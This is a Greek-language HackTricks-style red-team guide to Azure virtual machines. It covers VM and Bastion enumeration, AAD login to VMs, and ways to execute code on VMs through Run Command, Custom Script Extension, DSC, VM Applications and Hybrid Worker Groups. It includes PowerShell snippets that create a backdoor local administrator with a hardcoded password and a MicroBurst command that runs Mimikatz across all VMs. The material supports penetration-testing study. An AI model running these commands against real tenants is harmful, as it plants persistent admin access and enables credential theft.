# Az - Εικονικές Μηχανές & Δίκτυο

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}

## Βασικές πληροφορίες

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Οι εικονικές μηχανές Azure είναι ένας από τους πολλούς τύπους [υπηρεσιών υπολογισμού επί παραγγελία, κλιμακούμενων](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) που προσφέρει η Azure. Συνήθως, επιλέγετε μια εικονική μηχανή όταν χρειάζεστε περισσότερο έλεγχο επί του περιβάλλοντος υπολογισμού από ό,τι προσφέρουν οι άλλες επιλογές. Αυτό το άρθρο σας παρέχει πληροφορίες σχετικά με το τι πρέπει να λάβετε υπόψη πριν δημιουργήσετε μια εικονική μηχανή, πώς να τη δημιουργήσετε και πώς να τη διαχειριστείτε.

## Πληροφορίες Δικτύου Azure

Τα δίκτυα Azure περιέχουν **διαφορετικές οντότητες και τρόπους ρύθμισής τους.** Μπορείτε να βρείτε σύντομες **περιγραφές,** **παραδείγματα** και **εντολές απαρίθμησης** των διαφόρων οντοτήτων δικτύου Azure στο:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

Το **Azure Bastion** προσφέρει μια ασφαλή, πλήρως διαχειριζόμενη λύση πρόσβασης RDP (Remote Desktop Protocol) και SSH (Secure Shell) μέσω SSL μέσω της πύλης Azure. Είναι ενσωματωμένο σε ένα εικονικό δίκτυο Azure, επιτρέποντας συνδεσιμότητα RDP και SSH σε VMs χρησιμοποιώντας ιδιωτικές διευθύνσεις IP, αποφεύγοντας την ανάγκη δημόσιων διευθύνσεων IP. Αυτό το καθιστά μια πιο ασφαλή και βολική εναλλακτική λύση σε παραδοσιακές μεθόδους που περιλαμβάνουν την ανάθεση δημόσιων διευθύνσεων IP και τις ρυθμίσεις κανόνων NSG για την πρόσβαση VM. Οι προγραμματιστές και το προσωπικό IT μπορούν να έχουν ασφαλή πρόσβαση σε VMs από την πύλη Azure χρησιμοποιώντας τους web browsers τους, επιταχύνοντας τη διαδικασία για περιβάλλοντα ανάπτυξης και δοκιμών.

Για να εμφανίσετε όλους τους Azure Bastion Hosts στη συνδρομή σας, μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Απαρίθμηση Εικονικών Μηχανών
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Εκτέλεση εντολών σε ένα VM**

### **Σύνδεση AAD σε ένα VM**

Είναι δυνατόν να επιτραπεί η πρόσβαση σε χρήστες που έχουν ταυτοποιηθεί μέσω του AzureAD. Για παράδειγμα, προσπαθώντας να έχετε πρόσβαση σε ένα **linux VM**: `ssh username@azure-corp.com@1.1.1.1` (είναι σημαντικό να **χρησιμοποιήσετε το email** που χρησιμοποιήθηκε με το azurecorp κατά την προσπάθεια σύνδεσης) μπορεί να λάβετε ένα σφάλμα όπως:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Απλά **ακολουθήστε αυτές τις οδηγίες** πηγαίνοντας στη διεύθυνση [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) και δηλώνοντας τον κωδικό, χρησιμοποιήστε το email και τον κωδικό ως διαπιστευτήρια και θα μπορείτε να συνδεθείτε μέσω SSH (εάν ο χρήστης έχει επαρκή δικαιώματα για να το κάνει: ρόλο `Virtual Machine Administrator Login` ή `Virtual Machine User Login`).

### **Εκτέλεση Εντολής**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Εκτέλεση Επέκτασης Προσαρμοσμένου Σεναρίου**

Οι επεκτάσεις εικονικών μηχανών (VM) στο Azure είναι **μικρές εφαρμογές** που παρέχουν ρυθμίσεις μετά την αναπτυξη και αυτοματισμό **εργασιών** σε **VM του Azure**. Για παράδειγμα, αν μια εικονική μηχανή απαιτεί εγκατάσταση λογισμικού, προστασία από ιούς, ή τη δυνατότητα εκτέλεσης ενός σεναρίου μέσα σε αυτή, μπορείτε να χρησιμοποιήσετε μια επέκταση VM.

Επομένως, αν έχετε πρόσβαση για να το γράψετε, μπορείτε να εκτελέσετε αυθαίρετο κώδικα:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### Επιθυμητή Κατάσταση Διαμόρφωσης (DSC)

Η Επιθυμητή Κατάσταση Διαμόρφωσης (DSC) είναι ένα εργαλείο PowerShell παρόμοιο με το Ansible, χρησιμοποιείται για τη ρύθμιση ενός υπολογιστή μέσω κώδικα. Η DSC ενσωματώνεται με το Azure, επιτρέποντας το ανέβασμα συγκεκριμένων αρχείων διαμόρφωσης. Αυτά τα αρχεία πρέπει να συμμορφώνονται με μια αυστηρή σύνταξη. Ειδικότερα, η επέκταση DSC στο Azure μπορεί να εκτελέσει εντολές από αρχεία που πληρούν συγκεκριμένα κριτήρια μορφοποίησης, ακόμη κι αν η σύνταξη δεν είναι σωστή σύμφωνα με τα πρότυπα της DSC, όπως φαίνεται στο παρακάτω σχήμα.

Η εκτέλεση αυτών των εντολών διευκολύνεται από τη λειτουργία [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) στο Az PowerShell. Οι απαιτήσεις περιλαμβάνουν ένα αρχείο **.PS1** με μια ορισμένη συνάρτηση και το αρχείο πρέπει να συμπιεστεί σε ένα αρχείο **.zip**. Ακόμη κι αν η σύνταξη δεν είναι ακριβής για τη DSC, ο κώδικας θα εκτελεστεί παρόλα αυτά. Ωστόσο, η επέκταση θα επισημάνει την κατάσταση εκτέλεσης ως "αποτυχία", και καμία έξοδος από την εντολή δεν θα είναι ορατή λόγω του ότι η κατάσταση αντικαθίσταται από το μήνυμα αποτυχίας.

### Ορισμοί Εφαρμογών VM

Οι Ορισμοί Εφαρμογών VM επιτρέπουν την επαναλαμβανόμενη ανάπτυξη εκδόσεων εφαρμογών σε ένα Azure VM. Αυτός ο πόρος υποστηρίζει την ανάπτυξη και ενημέρωση εφαρμογών σε διάφορα VMs. Για να το ρυθμίσετε αυτό, απαιτούνται αρκετά βήματα, περιλαμβάνοντας εντολές όπως **`New-AzGalleryApplication`** και **`New-AzGalleryApplicationVersion`** στο Az PowerShell.

Η εκτέλεση εφαρμογών ή εντολών μέσω αυτής της μεθόδου περιλαμβάνει το **"VMAppExtension"**, το οποίο εγκαθίσταται αυτόματα όταν μια εφαρμογή εφαρμόζεται σε ένα VM. Η επέκταση ανακτά το αρχείο από το καθορισμένο URI και το ονομάζει ακριβώς όπως η εφαρμογή, χωρίς καμία επέκταση. Για να εκτελεστεί σωστά το αρχείο, το πεδίο "ManageActions" στην κλήση του REST API πρέπει να ρυθμιστεί ώστε να μετονομάσει το αρχείο με την κατάλληλη επέκταση. Η ρύθμιση αυτής της μεθόδου, όταν ολοκληρωθεί, θα μοιάζει με τη δομή που φαίνεται στο παρακάτω σχήμα.

Ωστόσο, αυτή η μέθοδος εκτέλεσης είναι σχετικά αργή, χρειάζονται περίπου 3-4 λεπτά για να εκτελέσει μια εφαρμογή ή μια εντολή. Τα αρχεία που σχετίζονται με αυτήν τη διαδικασία αποθηκεύονται σε συγκεκριμένους καταλόγους (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` για την αντιγραφή της εφαρμογής και `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` για την κατάσταση εκτέλεσης).

Και οι δύο τεχνικές παρέχουν μοναδικούς τρόπους εκτέλεσης εντολών και ανάπτυξης εφαρμογών σε περιβάλλοντα Azure, καθένα με τις δικές του απαιτήσεις, βήματα και σκέψεις.

### Ομάδες Υβριδικών Εργαζομένων (HWGs) στο Azure

[**Ομάδες Υβριδικών Εργαζομένων (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) είναι μια λειτουργία στο Azure που επιτρέπει σε Runbooks, που έχουν ρυθμιστεί σε έναν Λογαριασμό Αυτοματισμού, να εκτελούνται σε ένα Εικονικό Μηχάνημα (VM) του Azure που ανήκει στην καθορισμένη HWG. Αυτή η εκτέλεση διευκολύνεται μέσω μιας επέκτασης που εγκαθίσταται στο VM, η οποία αναπτύσσει τον κώδικα του Runbook στο VM. Ένα σημαντικό στοιχείο αυτής της διαδικασίας είναι ότι οι πραγματικές διαπιστεύσεις δεν είναι παράγοντας στην εκτέλεση επειδή ο κώδικας εκτελείται με αυξημένα προνόμια, ειδικότερα ως **SYSTEM** ή root, όπως φαίνεται στο παρακάτω σχήμα.

Ένα κρίσιμο στοιχείο για όσους χρησιμοποιούν VMs Windows 10 είναι η ανάγκη να καθορίσουν την έκδοση PowerShell για το Runbook. Πρέπει να οριστεί να εκτελείται ως Έκδοση PowerShell 5.1 αντί για 7.1. Αυτή η απαίτηση πηγάζει από το γεγονός ότι το PowerShell 7.1 δεν είναι εγκατεστημένο από προεπιλογή σε αυτά τα VMs, οδηγώντας σε αποτυχία στην εκτέλεση σεναρίου εάν καθοριστεί η έκδοση 7.1.

Αυτή η λειτουργία του Azure προσφέρει έναν αξιόπιστο τρόπο αυτοματισμού και διαχείρισης εργασιών σε υβριδικά περιβάλλοντα, επιτρέποντας την κεντρική διαχείριση και εκτέλεση εργασιών σε VMs του Azure.


## Αναφορές

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 στην ομάδα [**Discord**](https://discord.gg/hRep4RUj7f) ή στην ομάδα [**telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
